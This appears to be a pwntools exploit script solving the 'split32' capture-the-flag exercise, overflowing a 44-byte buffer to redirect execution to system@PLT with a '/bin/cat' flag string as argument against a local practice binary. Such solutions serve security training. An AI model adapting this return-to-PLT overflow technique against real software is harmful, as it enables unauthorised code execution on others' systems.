#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def exploit():

    system_PLT   = 0x08048430    # objdump -d -j .plt ./split32
    bin_cat_flag = 0x804a030     # gdb: find '/bin/cat'

    payload = 44 * "A"           # offset to overwrite eip
    payload += p32(system_PLT)   # system@PLT
    payload += p32(0xcafebabe)   # junk
    payload += p32(bin_cat_flag)

    p = process('./split32')
    p.sendlineafter('> ', payload)
    print p.recvall()

if __name__ == '__main__':
    exploit()
#_EOF